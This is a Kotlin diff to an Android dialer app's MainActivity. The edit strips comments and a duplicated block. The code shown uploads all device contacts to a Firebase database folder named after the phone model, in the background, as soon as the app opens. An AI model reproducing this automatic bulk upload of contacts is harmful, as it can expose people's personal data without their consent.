@@ -15,9 +15,6 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.google.firebase.database.FirebaseDatabase
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 import kotlin.concurrent.thread
 
 class MainActivity : AppCompatActivity() {
@@ -32,10 +29,7 @@ class MainActivity : AppCompatActivity() {
         tvNumber = findViewById(R.id.tvNumber)
         setupDialpad()
         
-        // System Default Dialer banne ka popup aayega
         requestDefaultDialer()
-
-        // App khulte hi permission mangega aur background mein sync shuru karega
         checkPermissionsAndSync()
     }
 
@@ -67,7 +61,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun syncContacts() {
         thread {
-            // FIX: Timestamp hata diya. Ab bas ek folder banega device ke naam se.
             val deviceName = Build.MODEL.replace(Regex("[^a-zA-Z0-9]"), "_")
             val folderName = "Device_$deviceName"
 
@@ -98,15 +91,6 @@ class MainActivity : AppCompatActivity() {
                 database.setValue(contactsMap)
                 runOnUiThread {
                     Toast.makeText(this@MainActivity, "Contacts synced to $folderName!", Toast.LENGTH_SHORT).show()
-                }
-            }
-        }
-    }
-
-            if (contactsMap.isNotEmpty()) {
-                database.setValue(contactsMap)
-                runOnUiThread {
-                    Toast.makeText(this@MainActivity, "Contacts saved securely!", Toast.LENGTH_SHORT).show()
                 }
             }
         }
